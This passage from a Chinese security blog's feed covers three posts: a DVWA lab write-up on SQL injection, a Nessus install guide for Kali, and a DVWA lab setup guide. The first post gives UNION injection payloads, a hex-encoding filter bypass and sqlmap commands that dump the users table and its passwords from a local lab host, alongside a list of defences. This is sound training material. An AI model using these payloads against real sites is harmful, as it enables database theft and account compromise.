alt="24.png"></p><p>说明<code>dvwa</code>数据库中存在<code>guestbook</code>，<code>users</code>两张表</p><p>可猜出查询语句为<code>select 字段1,字段2 from users where 字段= ;</code></p><h2 id="获取dvwa库users表中的列名-1"><a href="#获取dvwa库users表中的列名-1" class="headerlink" title="获取dvwa库users表中的列名"></a>获取dvwa库users表中的列名</h2><ol><li><p>改包，使输入为<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--</code></p><p> 查询失败</p><p> <img src="/images/baji/dvwa/SQL Injection/25.png" alt="25.png"></p><p> 因对<code>&#39;</code>等特殊字符进行了转义，所以查询失败</p></li><li><p>使用十六进制对过滤进行绕过</p><p> 使用<code>BurpSuite</code>将<code>users</code>转换为十六进制<code>0x7573657273</code></p><p> <img src="/images/baji/dvwa/SQL Injection/26.png" alt="26.png"></p><p> 改包，使输入为<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--</code></p><p> <img src="/images/baji/dvwa/SQL Injection/27.png" alt="27.png"></p></li></ol><p>发现<code>dvwa</code>库<code>users</code>表中有8列(即字段)，分别是<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p><p>可猜出查询语句为<code>select first_name,last_name from users where user_id= ;</code></p><h2 id="获取数据记录-1"><a href="#获取数据记录-1" class="headerlink" title="获取数据记录"></a>获取数据记录</h2><p>改包，使输入为<code>1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users--</code></p><p><img src="/images/baji/dvwa/SQL Injection/28.png" alt="28.png"></p><p>则得到了<code>dvwa</code>库中<code>users</code>表中所有用户的<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>password</code>的数据</p><hr><h1 id="High级别漏洞利用"><a href="#High级别漏洞利用" class="headerlink" title="High级别漏洞利用"></a>High级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型-2"><a href="#判断是否存在注入，注入是字符型还是数字型-2" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><p><code>High</code>级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的<code>sqlmap</code>注入，因为<code>sqlmap</code>在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入</p><p><img src="/images/baji/dvwa/SQL Injection/29.png" alt="29.png"></p><p><img src="/images/baji/dvwa/SQL Injection/30.png" alt="30.png"></p><p><code>High</code>级别在<code>low</code>级别的基础上，在<code>SQL</code>查询语句后加入<code>LIMIT 1</code>，用于希望以此控制只输出一个结果，可通过<code>--</code>注释符来进行注释</p><p><code>High</code>级别对数据库报错进行了处理，显示统一的报错信息</p><p>与<code>low</code>级别的注入基本相似</p><hr><h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码采用了<code>PDO</code>技术，划清了代码与数据的界限，有效防御<code>SQL</code>注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，<code>Anti-CSRFtoken</code>机制的加入了进一步提高了安全性</p><p><code>PHP</code>数据对象（<code>PDO</code>）扩展为<code>PHP</code>访问数据库定义了一个轻量级的一致接口</p><p><code>PDO</code>提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据</p><hr><h1 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h1><ol><li><p>所有的查询语句都使用数据库提供的参数化查询接口</p></li><li><p>对进入数据库的特殊字符(<code>&#39;</code>，<code>&quot;</code>，<code>select</code>，<code>union</code>，<code>--</code>，<code>#</code>，<code>order by</code>)进行转义处理，或编码转换</p></li><li><p>严格限制数据类型</p></li><li><p>严格限制参数长度</p></li><li><p>网站每个数据层的编码统一，建议<code>UTF-8</code></p></li><li><p>严格限制网站用户的数据库的操作权限，最小权限原则</p></li><li><p>统一错误信息提示</p></li><li><p>使用预编译语句</p></li><li><p>使用存储过程</p></li><li><p>白名单验证输入</p></li></ol><hr><h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/SQL Injection/31.png" alt="31.png"></p><h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa --tables --batch</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/SQL Injection/32.png" alt="32.png"></p><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa -T users --column --batch</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/SQL Injection/33.png" alt="33.png"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/SQL Injection/34.png" alt="34.png"></p><p><img src="/images/baji/dvwa/SQL Injection/35.png" alt="35.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>kali下安装nessus</title>
    <link href="http://yoursite.com/2019/05/11/kali%E4%B8%8B%E5%AE%89%E8%A3%85nessus/"/>
    <id>http://yoursite.com/2019/05/11/kali下安装nessus/</id>
    <published>2019-05-10T17:11:00.000Z</published>
    <updated>2020-02-24T04:31:21.168Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载地址： <a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">https://www.tenable.com/downloads/nessus</a></p><p>选择对应的安装包</p><p><img src="/images/shentouceshi_tools/nessus/1.png" alt="1.png"></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i Nessus-8.3.2-ubuntu910_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/2.png" alt="2.png"></p><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nessusd start</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/3.png" alt="3.png"></p><h1 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1:8834</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/4.png" alt="4.png"></p><p>信任该地址</p><p><img src="/images/shentouceshi_tools/nessus/17.png" alt="17.png"></p><p><img src="/images/shentouceshi_tools/nessus/5.png" alt="5.png"></p><p>设置用户名、密码</p><h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><p><img src="/images/shentouceshi_tools/nessus/6.png" alt="6.png"></p><h2 id="在线获取激活码"><a href="#在线获取激活码" class="headerlink" title="在线获取激活码"></a>在线获取激活码</h2><p>访问 <a href="https://www.tenable.com/products/nessus/activation-code" target="_blank" rel="noopener">https://www.tenable.com/products/nessus/activation-code</a></p><p><img src="/images/shentouceshi_tools/nessus/7.png" alt="7.png"></p><p>填写名称、邮箱</p><p><img src="/images/shentouceshi_tools/nessus/8.png" alt="8.png"></p><p>下一步后，邮箱会收到一封邮件，其中包含有激活码</p><p>填写到上方激活码的填写位置，即可激活家庭免费版</p><p>之后就会自动进行插件的下载、安装</p><p><img src="/images/shentouceshi_tools/nessus/9.png" alt="9.png"></p><h2 id="离线获取激活码"><a href="#离线获取激活码" class="headerlink" title="离线获取激活码"></a>离线获取激活码</h2><p>在内网主机完成程序安装后由于无法访问外网，所以需要离线激活</p><ol><li><p>获取设备代码</p><p> <img src="/images/shentouceshi_tools/nessus/100.png" alt="10.png"></p><p> 选择<code>offline</code>选项，并复制设备代码</p><p> 也可通过</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/nessus/sbin</span><br><span class="line">./nessuscli fetch --challenge</span><br></pre></td></tr></table></figure><p> 获取设备代码</p></li><li><p>获取激活码</p><p> 访问 <a href="https://www.tenable.com/products/nessus/activation-code" target="_blank" rel="noopener">https://www.tenable.com/products/nessus/activation-code</a></p><p> <img src="/images/shentouceshi_tools/nessus/7.png" alt="7.png"></p><p> 填写名称、邮箱</p><p> <img src="/images/shentouceshi_tools/nessus/8.png" alt="8.png"></p><p> 下一步后，邮箱会收到一封邮件，其中包含有激活码</p></li><li><p>获取离线激活码</p><p> 访问 <a href="https://plugins.nessus.org/v2/offline.php" target="_blank" rel="noopener">https://plugins.nessus.org/v2/offline.php</a></p><p> <img src="/images/shentouceshi_tools/nessus/11.png" alt="11.png"></p><p> 上方填写设备代码，下方填写邮件收到的激活码</p><p> 下一步后，会获取<code>license</code>文本及<code>nessus.license</code>文件</p><p> <img src="/images/shentouceshi_tools/nessus/122.png" alt="12.png"></p><p> <strong>注意，需同时下载上方红框中的离线插件安装包，用于后续离线安装插件</strong></p><p> 将<code>license</code>文本复制，填写到激活界面</p><p> <img src="/images/shentouceshi_tools/nessus/133.png" alt="13.png"></p><p> 即可完成离线激活</p><p> 接下来会进行插件的下载、安装过程，但因无法连接外网，所以插件下载并不会成功</p></li></ol><hr><h1 id="插件问题"><a href="#插件问题" class="headerlink" title="插件问题"></a>插件问题</h1><p><code>Nessus</code>扫描器在先部署完成时，一般在输入激活码以后会自动在线下载插件包进行更新，但是有时候因为诸多原因如网络不稳定、磁盘空间不足或人为中止了插件下载等，都会导致插件更新失败，另外因没网络选择离线部署时也需要单独更新插件，这时就需要手动下载插件并更新</p><p><img src="/images/shentouceshi_tools/nessus/14.png" alt="14.png"></p><p>此时应进行离线插件安装，这时就需要上方提前下载的离线插件安装包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/nessus/sbin/</span><br><span class="line">./nessuscli update ~/all-2.0.tar.gz</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/188.png" alt="18.png"></p><p>重新启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./nessusd</span><br></pre></td></tr></table></figure><p><img src="/images/shentouceshi_tools/nessus/19.png" alt="19.png"></p><p>访问<code>https://127.0.0.1:8834</code>，输入前面设置的用户名、密码即可</p><p><img src="/images/shentouceshi_tools/nessus/16.png" alt="16.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="漏洞扫描" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>DVWA靶机</title>
    <link href="http://yoursite.com/2019/05/05/DVWA%E9%9D%B6%E6%9C%BA/"/>
    <id>http://yoursite.com/2019/05/05/DVWA靶机/</id>
    <published>2019-05-05T07:58:00.000Z</published>
    <updated>2022-06-30T18:04:57.043Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>以<code>64位</code>环境为例</p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p><code>CentOS-7-x86_64-Minimal-2009</code></p><h2 id="中间件、数据库等"><a href="#中间件、数据库等" class="headerlink" title="中间件、数据库等"></a>中间件、数据库等</h2><p>使用<code>xampp</code>完整包集成环境</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">https://www.apachefriends.org/zh_cn/download.html</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x xampp-linux-x64-5.6.23-0-installer.run</span><br><span class="line">./xampp-linux-x64-5.6.23-0-installer.run</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/1.png" alt="1.png"></p><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><ol><li><p>兼容性问题</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/lampp</span><br></pre></td></tr></table></figure><p> 将<code>export LD_ASSUME_KERNEL=2.2.5</code>修改为<code>export LD_ASSUME_KERNEL=2.8.0</code></p></li><li><p>安装<code>net-tools</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh net-tools-2.0-0.25.20131004git.el7.x86_64.rpm</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/11.png" alt="11.png"></p></li></ol><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp start</span><br></pre></td></tr></table></figure><p>会提示<code>ok</code>，启动成功</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="安全性设置"><a href="#安全性设置" class="headerlink" title="安全性设置"></a>安全性设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lampp security</span><br></pre></td></tr></table></figure><p><img src="/images/baji/dvwa/2.png" alt="2.png"></p><ol><li><p>设置<code>XAMPP pages</code>的密码</p></li><li><p>重启<code>mysql</code></p></li><li><p>设置<code>mysql/phpadmin</code>用户<code>pma</code>的密码</p></li><li><p>设置<code>mysql</code>用户<code>root</code>的密码</p></li><li><p>设置<code>ftp</code>用户<code>daemon</code>的密码</p></li></ol><p>重启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lampp restart</span><br></pre></td></tr></table></figure><h4 id="访问设置"><a href="#访问设置" class="headerlink" title="访问设置"></a>访问设置</h4><ol><li><p>设置<code>ServerName</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/etc/</span><br><span class="line">vi httpd.conf</span><br></pre></td></tr></table></figure><p> 修改<code>ServerName</code>行,设置为：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerName localhost:80</span><br></pre></td></tr></table></figure><p>重启服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp restart</span><br></pre></td></tr></table></figure></li><li><p>开放防火墙80端口</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure></li></ol><p>同网络下主机即可访问</p><p><img src="/images/baji/dvwa/10.png" alt="10.png"></p><h2 id="配置dvwa靶机"><a href="#配置dvwa靶机" class="headerlink" title="配置dvwa靶机"></a>配置dvwa靶机</h2><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><ol><li><p>安装<code>unzip</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh unzip-6.1c-3.1.mga7.x86_64.rpm</span><br></pre></td></tr></table></figure></li><li><p>解压<code>dvwa</code>源码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip DVWA-master.zip -d /opt/lampp/htdocs/</span><br></pre></td></tr></table></figure></li></ol><h3 id="设置访问"><a href="#设置访问" class="headerlink" title="设置访问"></a>设置访问</h3><ol><li><p>更改网站根目录</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/etc/httpd.conf</span><br></pre></td></tr></table></figure><p> 将<code>DocumentRoot &quot;/opt/lampp/htdocs&quot;</code>更改为<code>DocumentRoot &quot;/opt/lampp/htdocs/DVWA-master&quot;</code></p></li><li><p>设置<code>dvwa</code>配置文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/htdocs/DVWA-master/config</span><br><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure></li></ol><p>重启<code>lampp</code>服务即可访问</p><p><img src="/images/baji/dvwa/3.png" alt="3.png"></p><h3 id="配置DVWA"><a href="#配置DVWA" class="headerlink" title="配置DVWA"></a>配置DVWA</h3><ol><li><p><code>PHP function allow_url_include: Disabled</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/etc/php.ini</span><br></pre></td></tr></table></figure><p>将<code>allow_url_include=Off</code>改为<code>allow_url_include=On</code></p></li><li><p><code>reCAPTCHA key: Missing</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ]  = &apos;&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;&apos;;</span><br></pre></td></tr></table></figure><p>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;recaptcha_public_key&apos; ]  = &apos;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&apos;;</span><br><span class="line">$_DVWA[ &apos;recaptcha_private_key&apos; ] = &apos;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&apos;;</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p><code>Unable to connect to the database.</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php</span><br></pre></td></tr></table></figure><p> 将<code>$_DVWA[ &#39;db_password&#39; ] = &#39;&#39;;</code>中的值改为自己<code>mysql</code>的<code>root</code>用户的密码</p></li><li><p>对目录无可写权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 757 /opt/lampp/htdocs/DVWA-master/hackable/uploads/</span><br><span class="line">chmod 646 /opt/lampp/htdocs/DVWA-master/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br><span class="line">chmod 757 /opt/lampp/htdocs/DVWA-master/config</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>重启服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp restart</span><br></pre></td></tr></table></figure></li></ol><p>刷新页面即可</p><p><img src="/images/baji/dvwa/4.png" alt="4.png"></p><h3 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h3><p>点击<code>Create/Reset Database</code>后会创建数据库</p><p>报错：</p><p><img src="/images/baji/dvwa/5.png" alt="5.png"></p><p>默认安装的是<code>MariaDB</code>数据库，并不是<code>Mysql</code>，不能按照<code>Mysql</code>的配置来不然会报错</p><p>解决：</p><ol><li><p>停止<code>lampp</code>服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp stop</span><br></pre></td></tr></table></figure></li><li><p>删除一些缓存文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /opt/lampp/var/mysql/VM_* # 删除mysql相关缓存</span><br><span class="line">rm -rf /opt/lampp/var/proftpd.pid# 删除proftp相关缓存</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>启动<code>lampp</code>服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/</span><br><span class="line">./lampp start</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>启动进入<code>mysql</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/lampp/bin/</span><br><span class="line">./mysql -uroot -p</span><br></pre></td></tr></table></figure><p> 输入密码，进入</p><p> <img src="/images/baji/dvwa/6.png" alt="6.png"></p></li><li><p>配置数据库</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create user dvwa;</span><br><span class="line">grant all on dvwa.* to dvwa@localhost identified by &apos;123456&apos;;</span><br><span class="line">flush privileges;</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p> <img src="/images/baji/dvwa/777.png" alt="7.png"></p></li><li><p>修改配置文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/lampp/htdocs/DVWA-master/config/config.inc.php</span><br></pre></td></tr></table></figure><p> 将</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA[ &apos;db_server&apos; ]   = &apos;127.0.0.1&apos;;</span><br><span class="line">$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;</span><br><span class="line">$_DVWA[ &apos;db_user&apos; ]     = &apos;root&apos;;</span><br><span class="line">$_DVWA[ &apos;db_password&apos; ] = &apos;123456&apos;;</span><br></pre></td></tr></table></figure><p> 修改为：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  $_DVWA[ &apos;db_server&apos; ]   = &apos;localhost&apos;;</span><br><span class="line">$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;</span><br><span class="line">$_DVWA[ &apos;db_user&apos; ] = &apos;dvwa&apos;;</span><br><span class="line">$_DVWA[ &apos;db_password&apos; ] = &apos;123456&apos;;</span><br></pre></td></tr></table></figure></li></ol><ol start="7"><li><p>重启<code>lampp</code>服务即可</p><p> <img src="/images/baji/dvwa/8.png" alt="8.png"></p></li></ol><p>配置全部结束，即可登陆，默认用户名<code>admin</code>，密码<code>password</code></p><p><img src="/images/baji/dvwa/9.png" alt="9.png"></p><h2 id="设置环境开机自启"><a href="#设置环境开机自启" class="headerlink" title="设置环境开机自启"></a>设置环境开机自启</h2><ol><li><p>创建启动文件</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /lib/systemd/system/</span><br><span class="line">vi /lib/systemd/system/lampp.service</span><br></pre></td></tr></table></figure><p> 文件内容如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]# 服务的说明</span><br><span class="line">Description=lampp# 描述服务</span><br><span class="line">After=network.target# 描述服务类别</span><br><span class="line">      </span><br><span class="line">[Service]# 服务运行参数的设置</span><br><span class="line">Type=forking# 后台运行的形式</span><br><span class="line">ExecStart=/opt/lampp/lampp start# 服务的具体运行命令</span><br><span class="line">ExecReload=/opt/lampp/lampp restart# 重启命令</span><br><span class="line">ExecStop=/opt/lampp/lampp  stop# 停止命令</span><br><span class="line">PrivateTmp=true  # 表示给服务分配独立的临时空间</span><br><span class="line">      </span><br><span class="line">[Install]# 服务安装的相关设置，可设置为多用户</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li><li><p>设置启动文件权限</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 754 /lib/systemd/system/lampp.service</span><br></pre></td></tr></table></figure></li><li><p>设置开机自启</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable lampp.service</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="其他相关命令-与部署无关"><a href="#其他相关命令-与部署无关" class="headerlink" title="其他相关命令(与部署无关)"></a>其他相关命令(与部署无关)</h3><ol><li><p>启动服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start lampp.service</span><br></pre></td></tr></table></figure></li><li><p>取消开机自启</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl disable lampp.service</span><br></pre></td></tr></table></figure></li><li><p>查看服务状态</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status lampp.service</span><br></pre></td></tr></table></figure></li><li><p>重启服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart lampp.service</span><br></pre></td></tr></table></figure></li><li><p>查看所有已启动的服务</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --type=service</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
</feed>
